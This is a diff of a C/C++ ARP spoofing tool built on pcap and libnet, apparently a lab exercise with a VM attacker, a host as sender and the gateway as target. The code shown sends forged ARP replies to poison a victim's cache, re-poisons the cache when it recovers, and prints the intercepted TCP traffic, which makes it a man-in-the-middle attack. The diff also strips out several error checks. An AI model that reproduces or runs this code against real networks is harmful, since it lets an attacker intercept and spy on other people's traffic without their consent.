@@ -1,5 +1,7 @@
-/* attacker : VM guest Ubuntu
-   sender : VM host MacOS
+/*
+attacker : VM guest Ubuntu
+sender : VM host MacOS
+target : gateway
 */
 
 #include <pcap.h>
@@ -11,7 +13,6 @@
 #include <net/if.h>
 #include <arpa/inet.h>
 #include <libnet.h>
-#include <time.h>
 
 #define ARPPRO_IPV4 0x0800
 #define IP_ADDR_LEN 4
@@ -30,9 +31,11 @@ void usage(){
 	printf("sample: send_arp ens33 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
+
 template <class T> const T& min (const T& a, const T& b) {
   return !(b<a)?a:b;     // or: return !comp(b,a)?a:b; for version (2)
 }
+
 
 bool compare_mac(uint8_t* a, uint8_t* b){
 	for(int i=0; i<6; i++) if(a[i] != b[i]) return false;
@@ -41,7 +44,7 @@ bool compare_mac(uint8_t* a, uint8_t* b){
 
 void dump_data(uint8_t* p, int32_t len){
 	if(len == 0){
-		printf("None\n");
+		printf("None");
 		return;
 	}
 	printf("\n");
@@ -77,7 +80,7 @@ void print_packet(uint8_t * p){
 	printf("[Port src] : %hu\n", ntohs(tcp_h->th_sport));
 	printf("[Port dst] : %hu\n", ntohs(tcp_h->th_dport));
 	printf("[Data] : ");
-	dump_data(data, data_len);
+	dump_data(data, min<int>(data_len,32));
 	printf("\n------------------------------------------------\n\n\n");
 }
 
@@ -107,11 +110,7 @@ bool send_arp(pcap_t * handle, uint16_t op, uint8_t* eth_src, uint8_t* eth_dst, 
 		arp_a -> ar_tip[i] = arp_tip[i];
 	}
 
-	if (pcap_sendpacket(handle, buf, ARP_PACKET_LEN) == -1){
-		printf("failed to send\n");
-		return false;
-	}
-
+	pcap_sendpacket(handle, buf, ARP_PACKET_LEN);
 	return true;
 }
 
@@ -121,10 +120,6 @@ bool get_mac(pcap_t* handle, uint8_t* sender_mac){
 		const uint8_t* packet;
 		int res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
-		if (res == -1 || res == -2){
-			printf("error while reading packet\n");
-			return false;
-		}
 
 		struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*)packet;
 		if (ntohs(eth_h -> ether_type) != ETHERTYPE_ARP) continue;
@@ -140,27 +135,20 @@ bool get_mac(pcap_t* handle, uint8_t* sender_mac){
 	}
 }
 
-bool get_my_addr(const char* dev, uint8_t * my_mac, uint8_t* my_ip){
+void get_my_addr(const char* dev, uint8_t * my_mac, uint8_t* my_ip){
 	struct ifreq ifrq;
 	int s = socket(AF_INET, SOCK_DGRAM, 0);
 	
 	strcpy(ifrq.ifr_name, dev);
 
-	if (ioctl(s,SIOCGIFHWADDR, &ifrq) <0) {
-		printf("failed to get mac addr\n");
-		return false;
-	}
+	ioctl(s,SIOCGIFHWADDR, &ifrq);
 	for (int i=0; i<ETHER_ADDR_LEN; i++)
 		my_mac[i] = ifrq.ifr_hwaddr.sa_data[i];
 
-	if (ioctl(s, SIOCGIFADDR, &ifrq) <0) {
-		printf("failed to get ip addr\n");
-		return false;
-	}
+	ioctl(s, SIOCGIFADDR, &ifrq); 
 	*(in_addr*)my_ip = ((sockaddr_in*)&ifrq.ifr_addr)->sin_addr;
 	
 	close(s);
-	return true;
 }
 
 bool spoofed(uint8_t* p, uint8_t* sender_mac){
@@ -222,6 +210,7 @@ int main(int argc, char * argv[]){
 		send_arp(handle, ARPOP_REQUEST, my_mac, brdcst_mac, my_mac, my_ip, zero_mac, target_ip[n]);
 		get_mac(handle, target_mac[n]);
 	}
+
 	for (int n=0; n<session; n++)
 		send_arp(handle, ARPOP_REPLY, my_mac, sender_mac[n], my_mac, target_ip[n], sender_mac[n], sender_ip[n]);
 
@@ -231,7 +220,7 @@ int main(int argc, char * argv[]){
 		int res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
-		for (int n=0; n < session; n++){
+		for (int n=0; n<session; n++){
 			if(recovered((uint8_t*)packet, sender_mac[n], target_mac[n]))
 				send_arp(handle, ARPOP_REPLY, my_mac, sender_mac[n], my_mac, target_ip[n], sender_mac[n], sender_ip[n]);
 			
